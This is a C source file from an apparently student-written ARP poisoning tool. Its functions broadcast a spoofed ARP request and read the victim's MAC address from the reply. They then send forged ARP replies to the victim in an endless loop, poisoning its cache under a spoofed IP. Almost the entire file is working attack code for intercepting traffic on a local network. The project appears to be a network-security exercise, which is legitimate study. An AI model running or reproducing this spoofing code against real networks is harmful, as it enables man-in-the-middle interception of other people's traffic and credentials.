/*
** network.c for network in /home/janel/arp_poisoning
**
** Made by Janel
** Login   <janel@epitech.net>
**
** Started on  Thu Feb 23 15:22:01 2017 Janel
** Last update Tue Feb 28 18:27:56 2017 Janel
*/

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include "arp_poisoning.h"
#include "error_messages.h"
#include "packets.h"
#include "debug.h"

char			send_packet_to_broadcast(const int sd,
						 struct sockaddr_ll *device,
						 const uint8_t *my_mac_address,
						 const char *spoofed_ip_source,
						 const char *victim_ip)
{
  t_ethernet_packet	*ethernet_packet;
  t_arp_packet		*arp_packet;

  if (!(arp_packet = create_arp_packet(ARPOP_REQUEST, my_mac_address,
				       spoofed_ip_source, BROADCAST_ADDR,
				       victim_ip)))
    return (fprintf(stderr, ERROR_PACKET_CREATION_ARP), FALSE);
  fprintf(stdout, "[+] ARP packet created\n");

  if (!(ethernet_packet = create_ethernet_packet(my_mac_address, BROADCAST_ADDR, arp_packet)))
    return (fprintf(stderr, ERROR_PACKET_CREATION_ETHER), FALSE);
  fprintf(stdout, "[+] ETHER packet created\n");

  if ((sendto(sd, ethernet_packet, ARP_HEADER_LENGTH + ETH_HEADER_LENGTH, 0,
	      (const struct sockaddr *)device, sizeof(*device))) <= 0)
    return (fprintf(stderr, ERROR_COULD_NOT_SEND), FALSE);
  fprintf(stdout, "[+] Packet sent to broadcast\n");
  return (TRUE);
}


uint8_t				*get_victim_response(const int sd)
{
  char				buffer[IP_MAXPACKET];
  t_ethernet_packet		*ethernet_packet;
  t_arp_packet			*arp_packet;
  uint8_t			*victim_mac_address;

  if (!(victim_mac_address = malloc(sizeof(uint8_t) * HARDWARE_LENGTH)))
    return (NULL);
  fprintf(stdout, "[*] Listening for target response..\n");
  while (TRUE)
    {
      if (recvfrom(sd, buffer, IP_MAXPACKET, 0, NULL, NULL) <= 0)
	return (NULL);

      ethernet_packet = (t_ethernet_packet *)buffer;
      if (ntohs(ethernet_packet->ether_type) != ETH_P_ARP)
	continue ;

      arp_packet = (t_arp_packet *)(buffer + ETH_HEADER_LENGTH);
      if (ntohs(arp_packet->opcode) != ARPOP_REPLY)
	continue ;

      fprintf(stdout, "[+] Got response from victim\n");
      fprintf(stdout, "[*] Sender mac address: ");
      PRINT_MAC_ADDRESS(arp_packet->sender_mac);
      fprintf(stdout, "[*] Sender ip address: ");
      PRINT_IP_ADDRESS(arp_packet->sender_ip);
      fprintf(stdout, "[*] Target mac address: ");
      PRINT_MAC_ADDRESS(arp_packet->target_mac);
      fprintf(stdout, "[*] Target ip address: ");
      PRINT_IP_ADDRESS(arp_packet->target_ip);

      memcpy(victim_mac_address, arp_packet->sender_mac, HARDWARE_LENGTH * sizeof(uint8_t));
      fprintf(stdout, "[*] Victim's mac address: ");
      PRINT_MAC_ADDRESS(victim_mac_address);
      return (victim_mac_address);
    }
}

char			send_payload_to_victim(const int sd,
					       struct sockaddr_ll *device,
					       const uint8_t *my_mac_address,
					       const char *spoofed_ip_source,
					       const uint8_t *victim_mac_address,
					       const char *victim_ip)
{
  t_ethernet_packet	*ethernet_packet;
  t_arp_packet		*arp_packet;

  if (!(arp_packet = create_arp_packet(ARPOP_REPLY, my_mac_address,
				       spoofed_ip_source, victim_mac_address, victim_ip)))
    return (fprintf(stderr, ERROR_PACKET_CREATION_ARP), FALSE);
  if (!(ethernet_packet = create_ethernet_packet(my_mac_address, victim_mac_address, arp_packet)))
    return (fprintf(stderr, ERROR_PACKET_CREATION_ETHER), FALSE);

  while (TRUE)
    {
      if ((sendto(sd, ethernet_packet, ARP_HEADER_LENGTH + ETH_HEADER_LENGTH, 0,
		  (const struct sockaddr *)device, sizeof(*device))) <= 0)
	return (fprintf(stderr, ERROR_COULD_NOT_SEND), FALSE);
      fprintf(stdout, "[+] SPOOFED Packet sent to '%s'\n", victim_ip);
      sleep(SPOOFED_PACKET_SEND_DELAY);
    }
  return (TRUE);
}
